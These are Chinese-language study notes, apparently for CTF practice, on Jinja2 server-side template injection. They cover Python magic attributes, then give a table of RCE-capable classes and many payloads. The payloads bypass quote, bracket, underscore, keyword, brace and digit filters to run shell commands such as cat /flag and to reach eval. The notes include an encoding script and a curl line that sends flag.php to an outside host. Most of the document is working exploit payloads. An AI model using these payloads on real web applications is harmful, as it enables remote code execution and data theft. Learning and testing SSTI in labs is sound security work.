# SSTI

## SSTI基础

## 

## SSTI注入

### Magic function

* `__class__` 返回对象所属的类（即实例化该对象的类对象）

* `__bases__`  返回类的直接父类元组

* `__mro__` 显示方法解析顺序（Method Resolution Order），决定多重继承下的方法调用优先级

* `__subclasses__()` 返回类的直接子类列表

* `__init__` 构造函数，初始化实例属性

* `__globals__`  
	
	* 核心功能：返回函数所属模块的全局变量字典（仅函数对象拥有此属性）。
	* 安全风险：常被用于沙箱逃逸攻击，如通过 func.__globals__ 访问内置模块。
	
* `__builtins__` 它提供了对 Python 核心功能的全局访问权限

* `__getitem__`使对象可以像字典一样通过键（`key`）访问值，适用于自定义映射类型

  ```python
  	class Config:
      def __init__(self):
          self.data = {'host': 'localhost', 'port': 8080}
      def __getitem__(self, key):
          return self.data.get(key, 'N/A')  # 处理默认值
  
  config = Config()
  print(config['host'])  # 输出 'localhost'
  print(config['user'])  # 输出 'N/A'
  ```

* 
### SSTI 绕过
#### RCE 的危险类
|           类名           | 索引范围 |          利用方式           |                         典型Payload                          |
| :----------------------: | :------: | :-------------------------: | :----------------------------------------------------------: |
|     `os._wrap_close`     | 130-150  |      直接调用`os`模块       | `{{ subclasses[X].__init__.__globals__['os'].system('id') }}` |
| `warnings.catch_warning` | 59、166  | 通过`linecache`间接调用`os` | `{{ subclasses[59].__init__.__globals__['linecache'].os... }}` |
|    `subprocess.Popen`    |   255+   |   直接创建子进程执行命令    | `{{ subclasses[256]('whoami', shell=True,stdout=-1).communicate()[0] }}` |

#### 引号绕过

例子POC：

```python
{{().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.p](request.args.cmd).read()}}&p=popen&cmd=cat%20/flag

requset.args 替换 request.values、request.cookies
```

#### 方括号绕过

例子POC：

```python
{{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&a=cat /flag
```

#### 下划线绕过

https://jinja.palletsprojects.com/en/stable/templates/#attr 官方文档

`foo` (`getattr(foo, 'bar')`) == `foo.__getitem__('bar')`

```python
{{lipsum.__globals__['os'].popen('cat /flag').read()}} -->
{{(lipsum|attr(request.cookies.x)).os.popen(request.cookies.y).read()}}
```

`lipsum|attr('__globals__')` 等价于 `lipsum.__globals__`

attr 是 Jinja2 模板的过滤器，允许通过字符串动态访问对象的属性。

#### 关键字绕过

```python
{{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}
```

* .get(‘os’) 获取 __globals字典中的模块.

#### 使用lipsum

```python
lipsum.__globals__.get('os').popen('cat /flag').read()
```

#### {{}} 绕过

使用：`{% print() %}`

```python
{%print((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read())%}
```

jinja2

```python
{% set a=(()|select|string|list).pop(24) %}    // a = _
{% set globals=(a,a,dict(globals=1)|join,a,a)|join %}  // globals=__globals__
{% set init=(a,a,dict(init=1)|join,a,a)|join %}
{% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %}
{% set a=(lipsum|attr(globals)).get(builtins) %}
{% set chr=a.chr %}
{% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %}
```

* set 声明变量

```jinja2
{% set name = "Alice" %}  {# 赋值字符串 #}
{% set numbers = [1,2,3] %}  {# 赋值列表 #}
```

* |string 转换成字符串

* |select 生成过滤迭代器

* |list转换

* | join 默认将**字典的键（keys）**拼接为字符串

* dict(hh=1) 生成字典 {'hh' : 1}

* | count 获得字符串里的数字

#### 过滤数字

```
{% set two=(dict(aa=a))|join|length)%}
{% set two=(dict(aa=a))|join|count)%}
```

##### 半角转全角

脚本

```python
def half2full(half):
    full = ''
    for ch in half:
        if ord(ch) in range(33, 127):
            ch = chr(ord(ch) + 0xfee0)
        elif ord(ch) == 32:
            ch = chr(0x3000)
        else:
            pass
        full += ch
    return full
string = input("你要输入的字符串：")
result = ''
def str2chr(s):
    global  result
    for i in s:
        result += "chr("+half2full(str(ord(i)))+")%2b"
str2chr(string)
print(result[:-3])
```



#### 关于attr

1. 访问对象属性

   例如，若模板中传入一个对象

   ```
   user
   ```

   ，可通过

   ```
   {{ user|attr('name') }}
   ```

   获取其

   ```
   name
   ```

   属性值。这在处理动态属性名时非常有用

   调用对象方法

   若对象包含方法，如

   ```
   user.get_info()
   ```

   ，可通过

   ```
   {{ user|attr('get_info')() }}
   ```

   调用并输出结果
   
    
   
#### print绕过
##### 使用curl绕过
```bash
curl -X POST -F xx=@flag.php  http://aaa # xx表单字段
```

#### 一些POC

```python
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}

().__class__.__mro__[1].__subclasses__()[407]("cat /flag",shell=True,stdout=-1).communicate()[0]
```